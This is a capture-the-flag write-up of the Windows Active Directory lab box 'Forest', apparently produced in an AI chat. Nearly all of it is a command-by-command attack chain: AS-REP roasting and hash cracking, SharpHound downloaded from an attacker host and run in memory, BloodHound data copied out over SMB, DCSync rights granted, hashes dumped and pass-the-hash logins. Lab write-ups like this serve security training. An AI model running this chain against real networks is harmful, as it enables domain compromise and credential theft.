
## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)

## 🛰️ Recon

### Full TCP Port Scan
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.161
```

### Targeted Script Scan
```bash
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/nmap-tcpscripts 10.10.10.161
```

### UDP Scan
```bash
nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.161
```

---

## 🌲 Domain Discovery

### [DNS](DNS) Enumeration
```bash
dig @10.10.10.161 htb.local
dig @10.10.10.161 forest.htb.local
dig axfr @10.10.10.161 htb.local  # failed zone transfer
```

### Enumerating Users via [RPC](RPC.md)
```bash
rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querygroupmem 0x200
rpcclient $> queryuser 0x1f4
```

---

## 🧪 AS-REP Roasting

### Prepare User List
```bash
cat > users <<EOF
Administrator
andy
lucinda
mark
santi
sebastien
svc-alfresco
EOF
```

### Identify Vulnerable Users
```bash
for user in $(cat users); do
  GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user}
done
```

### Crack the Hash
```bash
hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force
# Password: s3rvice
```

---

## 💻 Shell as `svc-alfresco`

### WinRM Access
```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

### Capture User Flag
```powershell
type C:\Users\svc-alfresco\Desktop\user.txt
```

---

## 🩸 BloodHound + SharpHound

### Load SharpHound
```powershell
iex(New-Object Net.WebClient).DownloadString("http://<your_ip>/SharpHound.ps1")
Invoke-BloodHound -CollectionMethod All -Domain htb.local -LdapUser svc-alfresco -LdapPass s3rvice
```

### Exfil via SMB
```powershell
net use \\<your_ip>\share /u:df df
copy 202XXXXX_BloodHound.zip \\<your_ip>\share\
net use /d \\<your_ip>\share
```

---

## 🧭 Path to Domain Admin

### Add User to Exchange Group
```powershell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco
```

### Assign DCSync Rights
```powershell
$username = "htb\svc-alfresco"
$password = "s3rvice"
$secstr = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secstr

Add-DomainObjectAcl -Credential $cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

---

## 🔓 Dumping Administrator Hash

```bash
secretsdump.py svc-alfresco:s3rvice@10.10.10.161
```

---

## ⚙️ SYSTEM Shell

### Using Evil-WinRM
```bash
evil-winrm -i 10.10.10.161 -u administrator -H <NTLM hash>
```

### Or with wmiexec
```bash
wmiexec.py -hashes :<NTLM hash> htb.local/administrator@10.10.10.161
```

### Capture Root Flag
```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## 🧠 Beyond Root

- DCSync requires TCP 135, 445, and a high RPC port (like 49667).
- There’s a cleanup scheduled task (`revert.ps1`) that resets `svc-alfresco`’s password and group memberships every 60 seconds.
- You must move quickly between adding to Exchange Windows Permissions and running `Add-DomainObjectAcl`.

---

Let me know if you want this one exported as a markdown file or added to a master write-up! 🛠️🗒️